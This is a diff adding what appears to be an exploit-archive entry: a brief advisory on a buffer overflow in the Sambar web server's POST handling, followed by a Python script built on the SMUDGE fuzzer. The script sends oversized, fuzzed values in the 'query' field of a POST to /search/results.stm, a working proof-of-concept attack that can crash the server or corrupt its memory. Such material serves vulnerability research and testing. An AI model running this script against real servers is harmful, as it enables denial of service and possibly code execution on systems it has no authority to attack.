@@ -1,0 +1,32 @@
+source: http://www.securityfocus.com/bid/9607/info
+
+A buffer overflow vulnerability has been reported in the Sambar web server. The issue is due to a boundary condition error in the POST data processing of the affected software.
+
+Immediate consequences of an attack may result in a denial of service condition. It may also be possible for the attacker to manipulate process memory and execute arbitrary code in the context of the vulnerable process.
+
+# http://felinemenace.org/~nd/SMUDGE
+# Sambar script (c) nd@felinemenace.org
+from SMUDGE import *
+import sys
+sm = SMUDGE(1)
+
+sm.setname("SambarOverflow")
+
+sm.plain("POST /search/results.stm HTTP/1.1")
+sm.addcrlf()
+sm.plain("Host: MSUDGEDPU")
+sm.addcrlf()
+sm.plain("Content-Length: ")
+sm.blocksize("postdata")
+sm.addcrlf()
+sm.addcrlf()
+sm.putblock("postdata")
+sm.addcrlf()
+sm.addcrlf()
+
+sm.newblock("postdata")
+sm.updateblock("postdata","spage=0&indexname=docs&query=")
+sm.blockvariable("postdata","MEEP")
+sm.updateblock("postdata","&style=page")
+
+sm.run("127.0.0.1",80,"topdown","single")
